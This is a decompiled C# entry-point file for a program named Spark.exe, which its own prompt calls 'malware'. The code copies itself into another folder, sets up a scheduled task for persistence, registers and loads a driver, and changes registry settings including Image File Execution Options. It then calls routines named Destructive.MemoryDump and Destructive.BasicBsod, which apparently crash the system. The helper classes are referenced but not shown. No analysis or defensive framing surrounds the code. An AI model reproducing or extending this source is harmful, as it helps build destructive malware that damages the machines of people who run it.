// Decompiled with JetBrains decompiler
// Type: Spark.Start
// Assembly: Spark, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2DFB06E8-4427-4218-A5F6-F5DE139079B1
// Assembly location: C:\Users\adriel\Downloads\Spark\Chris@Spark.exe

using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

#nullable disable
namespace Spark;

internal class Start
{
  [DllImport("user32.dll", SetLastError = true)]
  private static extern bool SetProcessDPIAware();

  [MTAThread]
  private static void Main(string[] args)
  {
    Application.EnableVisualStyles();
    Start.SetProcessDPIAware();
    if (args.Length != 0 && args[0] == "/RSOD")
    {
      Files.UnpackFiles();
      Driver.Register();
      Driver.Load();
      Destructive.MemoryDump(1);
    }
    if (!Variables.Initialised && MessageBox.Show("This is malware, are you sure you want to execute it?", "Spark.exe", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.No)
      Environment.Exit(0);
    if (Variables.Running)
      Environment.Exit(0);
    if (!Variables.Initialised)
    {
      Start.InitialiseSpark();
    }
    else
    {
      Files.UnpackFiles();
      Threads.Main();
    }
  }

  public static void InitialiseSpark()
  {
    Files.UnpackFiles();
    File.Copy(AppDomain.CurrentDomain.BaseDirectory + "Spark.exe", Variables.FilePath + "\\Spark.exe");
    TaskScheduling.Schedule(Variables.FilePath + "\\Spark.exe");
    Files.Initialised();
    if (!Variables.x64)
    {
      Driver.Register();
      RegistryEdits.GeneralChanges();
      RegistryEdits.ImageFileExecutionOptions();
      Threads.Main();
    }
    Driver.Unblock();
    Destructive.BasicBsod();
  }
}
